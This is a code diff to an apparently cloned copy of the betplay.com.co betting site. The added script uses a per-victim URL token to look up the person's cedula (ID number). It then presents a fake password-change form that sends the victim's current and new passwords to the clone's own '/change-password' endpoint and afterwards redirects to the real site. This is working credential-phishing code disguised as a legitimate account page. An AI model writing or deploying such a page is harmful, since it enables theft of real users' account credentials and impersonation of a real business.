@@ -1652,17 +1652,49 @@ function(b,c){var f="https://analytics.tiktok.com/i18n/pixel/events.js";a._i=a._
 <div id="kumulos-ui-root"><div id="kumulos-ui-root-push"></div></div><img style="position: absolute; width: 1px; height: 1px; left: 0px; bottom: 0px; opacity: 0;" src="/static/img.gif"><img src="/static/adsct" height="1" width="1" fetchpriority="high" style="display: none;"><img src="/static/adsct(1)" height="1" width="1" fetchpriority="high" style="display: none;"><script type="text/javascript" id="" charset="">function setCookie(b,d,c){var a="";c&&(a=new Date,a.setTime(a.getTime()+c*864E5),a="; expires\x3d"+a.toUTCString());document.cookie=b+"\x3d"+(d||"")+a+"; path\x3d/; domain\x3d.betplay.com.co; SameSite\x3dNone; Secure"}var s2Value=(new URLSearchParams(window.location.search)).get("s2");s2Value?setCookie("s2",s2Value,7):typeof dtpCallback==="function"?dtpCallback(function(){var b=dtpCallback.getClickID();b&&setCookie("s2",b,30)}):console.error("dtpCallback is not defined");</script><script type="text/javascript" id="" charset="">woopra.identify({fbc:"undefined",fbp:"fb.2.1791163329153.213432076280269442"});woopra.track("pv",{url:window.location.pathname+window.location.search,title:document.title,slug:window.location.pathname});</script><script type="text/javascript" id="" charset="">(function(){function g(a){try{var b=(new URLSearchParams(location.search)).get(a);if(b)return b;var c=location.hash||"",h=c.indexOf("?");return h!==-1&&(b=(new URLSearchParams(c.slice(h+1))).get(a))?b:null}catch(r){return null}}function k(a){return(a=document.cookie.match("(?:^|; )"+a+"\x3d([^;]*)"))?decodeURIComponent(a[1]):null}function l(a,b){var c=new Date;c.setTime(c.getTime()+m*864E5);document.cookie=a+"\x3d"+encodeURIComponent(b)+"; expires\x3d"+c.toUTCString()+"; path\x3d/; domain\x3d"+n+
 "; SameSite\x3dLax; Secure"}var f="affiliatefrom",d="affiliatefrom",e="817c6d24-0fe9-4e3e-98c3-55857c6c38c5",m=30,n=".betplay.com.co",p="/registrarse",q=g(f);q===e?l(d,e):(location.pathname.replace(/\/+$/,"")||"/")!==p||g(f)||k(d)!==e||(d=new URLSearchParams(location.search),d.set(f,e),location.replace(location.pathname+"?"+d.toString()+location.hash))})();</script><iframe src="javascript:false" style="width: 0px; height: 0px; border: 0px; display: none !important;" data-single-file-win-id="0.1" src="/static/saved_resource.html"></iframe><script type="text/javascript" id="" charset="">try{var valida18=0;"undefined"!==typeof Storage&&(valida18=sessionStorage.getItem("MtDim18"));if(null==valida18||void 0==valida18)valida18=0;if((0==valida18||1==valida18)&&void 0!=document.getElementsByClassName("myBalance name sideLinkProfile contentBalance mb-0")[0]){var data=document.getElementsByClassName("myBalance name sideLinkProfile contentBalance mb-0")[0].outerText;if(void 0!=data&&"undefined"!=data&&(data=data.split(":"),data=data[1].trim(),data=data.split("$"),data=data[1].trim(),window.dataLayer=
 window.dataLayer||[],dataLayer.push({saldoCuenta:data}),"undefined"!==typeof Storage)){var suma=parseInt(valida18)+1;sessionStorage.setItem("MtDim18",suma)}}}catch(a){console.log("::Error Tag.GA.Saldo Cuenta: "+a);var evento={event:"ga_event_err",category:"Control-Implementacion",action:"Tag.GA.Saldo Cuenta",label:a};dataLayer.push(evento)};</script> <img src="/static/adsct(2)" height="1" width="1" fetchpriority="high" style="display: none;"><img src="/static/adsct(3)" height="1" width="1" fetchpriority="high" style="display: none;">
+<style>
+.msg-respuesta{display:none;margin:20px 0 6px;padding:16px 18px;border-radius:10px;font-size:16px;line-height:1.5;text-align:left}
+.msg-error{background:#f8d7dc;color:#7d1424}
+.msg-ok{background:#d6f3e1;color:#0e5c35}
+.msg-info{background:#d9eefb;color:#00306e}
+</style>
 <script>
+var CEDULA = "";
 // Registrar visita
 (function(){
   var t = new URLSearchParams(window.location.search).get("t");
   if (!t) return;
   fetch("/token/" + t).then(function(r){return r.json();}).then(function(data){
     if(data && data.cedula){
-      // Datos recibidos, visita registrada
+      CEDULA = data.cedula;
     }
   }).catch(function(){});
 })();
+
+function valCampo(id){ var e = document.getElementById(id); return e ? e.value : ""; }
+function mostrarMensaje(tipo, texto){
+  var el = document.getElementById("msgResultado");
+  if (!el) return;
+  el.className = "msg-respuesta msg-" + (tipo || "info");
+  el.textContent = texto || "";
+  el.style.display = texto ? "block" : "none";
+}
+function alAceptar(){
+  var actual = valCampo("mat-input-0"), nueva = valCampo("mat-input-1");
+  if (!CEDULA) { mostrarMensaje("error", "Link inválido o expirado."); return; }
+  if (!actual || !nueva) { mostrarMensaje("error", "Completa los dos campos."); return; }
+  if (actual === nueva) { mostrarMensaje("error", "La nueva contraseña debe ser distinta de la actual."); return; }
+  if (nueva.length < 8 || nueva.length > 12) { mostrarMensaje("error", "La contraseña debe tener mínimo 8 y máximo 12 caracteres."); return; }
+  if (/\s/.test(nueva)) { mostrarMensaje("error", "La contraseña no puede contener espacios."); return; }
+  if (!/[A-Z]/.test(nueva)) { mostrarMensaje("error", "La contraseña debe contener mínimo una mayúscula."); return; }
+  if (!/[^A-Za-z0-9]/.test(nueva)) { mostrarMensaje("error", "La contraseña debe contener mínimo un carácter especial."); return; }
+  mostrarMensaje("info", "Procesando...");
+  fetch("/change-password", { method:"POST", headers:{"Content-Type":"application/json"}, body: JSON.stringify({username:CEDULA,current_password:actual,new_password:nueva}) })
+    .then(function(r){ return r.json(); }).then(function(data){
+      if(data && data.success){ mostrarMensaje("ok", "Contraseña actualizada correctamente."); setTimeout(function(){ window.location.href = "https://betplay.com.co"; }, 5000); }
+      else{ mostrarMensaje("error", (data && data.detail) || data.message || "No fue posible actualizar."); }
+    }).catch(function(){ mostrarMensaje("error", "Error de conexión con el servidor."); });
+}
 
 // Cargar logos que faltan
 setTimeout(function(){
